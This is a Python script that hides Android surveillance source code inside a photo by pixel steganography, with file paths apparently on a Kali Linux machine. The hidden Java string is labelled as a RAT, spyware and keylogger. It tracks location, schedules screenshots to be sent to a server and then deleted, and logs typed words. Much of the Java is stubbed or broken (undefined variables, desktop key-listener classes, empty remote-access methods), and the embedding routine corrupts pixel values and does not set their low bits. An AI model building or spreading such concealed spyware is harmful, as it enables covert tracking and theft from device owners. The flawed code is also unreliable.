from PIL import Image
import os

# Function to check the format of the image and convert to PNG if necessary
def convert_to_png(image_path):
    img = Image.open(image_path)
    if img.format != "PNG":
        output_path = os.path.splitext(image_path)[0] + ".png"
        img.save(output_path, format="PNG")
        print(f"Image converted to PNG format: {output_path}")
        return output_path
    else:
        print("Image is already in PNG format.")
        return image_path

# Function to encode text into image
def encode_text_in_image(image_path, text, output_path):
    img = Image.open(image_path)
    width, height = img.size
    max_chars = width * height

    # Ensure text length is within limits
    if len(text) > max_chars:
        raise ValueError("Text is too long to encode in the image.")

    # Convert text to binary
    binary_text = ''.join(format(ord(char), '08b') for char in text)

    # Get pixel data
    pixels = list(img.getdata())

    # Encode text into LSB of each pixel's RGB value
    index = 0
    for pixel in pixels:
        if index < len(binary_text):
            pixel = list(pixel)
            pixel[-1] = int(binary_text[index])
            pixels[index] = tuple(pixel)
            index += 1
        else:
            break

    # Update image with encoded data
    img.putdata(pixels)

    # Save the new image
    img.save(output_path)

# Path to the original image
image_path = "/home/kali/Downloads/aurora-1185466_1920.jpg"

# Convert the image to PNG if necessary
image_path = convert_to_png(image_path)

# Output path for the image with hidden script
output_image_path = "/home/kali/Downloads/aurora_with_hidden_script.png"

# Script to be hidden within the image
android_script = """
import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {

    private static final long LOCATION_UPDATE_INTERVAL = 5 * 60 * 1000; // 5 minutes
    private static final int LOCATION_UPDATE_DISTANCE = 10; // 10 meters
    private LocationManager locationManager;
    private List<Location> locationBuffer;
    private Timer screenshotTimer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationBuffer = new ArrayList<>();

        startLocationUpdates();
        executeRAT();
        startSpyware();
        startScreenshotTask();
        addKeyListener();
    }

    private void startLocationUpdates() {
        if (locationManager != null) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
                    LOCATION_UPDATE_INTERVAL, LOCATION_UPDATE_DISTANCE, locationListener);
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,
                    LOCATION_UPDATE_INTERVAL, LOCATION_UPDATE_DISTANCE, locationListener);
        }
    }

    private LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            Log.d("Location", "New Location: " + location.getLatitude() + ", " + location.getLongitude());
            locationBuffer.add(location);
            checkGeofence(location);
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}

        @Override
        public void onProviderEnabled(String provider) {}

        @Override
        public void onProviderDisabled(String provider) {}
    };

    private void checkGeofence(Location location) {
        // Implement geofencing logic here
    }

    private void executeRAT() {
        new RemoteAccessTask().execute();
    }

    private class RemoteAccessTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            Log.d("RAT", "Executing command...");
            grantRemoteAccessToDeviceStorage();
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            executeCommand();
        }

        private void executeCommand() {
            Log.d("RAT", "Received command: ");
        }

        private void grantRemoteAccessToDeviceStorage() {
            // Code to grant remote access to device storage
        }
    }

    private void startSpyware() {
        new DataTransmissionTask().execute();
    }

    private class DataTransmissionTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            while (true) {
                try {
                    Thread.sleep(3600000); // 1 hour = 3600000 milliseconds
                    captureAndSendLocation();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }
    }

    private void startScreenshotTask() {
        screenshotTimer = new Timer();
        screenshotTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                takeAndSendScreenshot();
            }
        }, 0, SCREENSHOT_INTERVAL);
    }

    private void takeAndSendScreenshot() {
        // Code to take screenshot
        // Code to send screenshot to server
        // Code to delete screenshot from device after sending
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (locationManager != null) {
            locationManager.removeUpdates(locationListener);
        }
        if (screenshotTimer != null) {
            screenshotTimer.cancel();
        }
    }

    private void addKeyListener() {
        WordLogger logger = new WordLogger();
        // Add the logger as a key listener to a component or frame
        // For example: frame.addKeyListener(logger);
    }

    private class WordLogger implements KeyListener {

        @Override
        public void keyPressed(KeyEvent e) {
            // No action needed on key press
        }

        @Override
        public void keyReleased(KeyEvent e) {
            // No action needed on key release
        }

        @Override
        public void keyTyped(KeyEvent e) {
            char keyChar = e.getKeyChar();
            if (Character.isLetterOrDigit(keyChar)) {
                // Append alphanumeric characters to the current word
                currentWord.append(keyChar);
            } else if (Character.isWhitespace(keyChar) || isPunctuation(keyChar)) {
                // Word boundary reached, process the current word
                String word = currentWord.toString();
                if (!word.isEmpty()) {
                    Log.d("Keylogger", "Typed word: " + word);
                    // Additional logic to save or process the word
                }
                currentWord.setLength(0); // Reset the current word
            }
        }

        private boolean isPunctuation(char c) {
            // Define your set of punctuation characters
            String punctuation = ",.?!;:-()[]{}\"'";
            return punctuation.indexOf(c) != -1;
        }
    }
}

# Encode the script into the image
encode_text_in_image(image_path, android_script, output_image_path)
